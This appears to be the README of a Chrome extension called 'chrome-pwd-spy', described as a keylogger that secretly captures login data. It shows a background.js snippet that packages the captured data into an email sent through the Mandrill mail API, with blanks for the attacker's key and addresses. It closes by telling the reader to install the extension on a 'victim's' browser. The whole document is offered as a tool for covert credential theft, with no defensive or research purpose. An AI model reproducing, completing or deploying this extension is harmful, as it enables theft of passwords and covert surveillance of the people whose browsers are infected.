### #сhrome-pwd-spy

Simplest keylogger, discreetly records login data to mandrill email.

##### how to use ->

*js/background.js:*

```javascript
var data = {
    'key': '', //<--- Your key there
    'message': {
    'from_email': '', //<--- from
    'to': [
     {
        'email': '', //<--- to
        'name': 'PWD',
        'type': 'to'
     }
     ],
        'autotext': 'true',
        'subject': 'PWD',
        'html':'<div>' + html + '</div>'
     }
};
```

Set your mandrill credentials, then install extension on your victim's chrome browser and that's it!